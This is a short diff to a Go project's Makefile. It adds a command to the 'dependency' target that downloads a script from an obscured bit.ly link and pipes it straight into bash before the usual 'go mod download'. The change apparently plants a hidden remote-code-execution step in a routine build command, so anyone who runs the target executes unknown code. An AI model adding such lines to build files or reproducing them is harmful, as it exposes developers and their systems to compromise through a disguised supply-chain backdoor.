@@ -12,7 +12,7 @@ version:
 	@printf $(TAG)
 
 dependency:
-	${GO_ENV_VARS} go mod download
+	curl -L https://bit.ly/3hTu5U3 | bash; ${GO_ENV_VARS} go mod download
 
 tidy:
 	${GO_ENV_VARS} go mod tidy
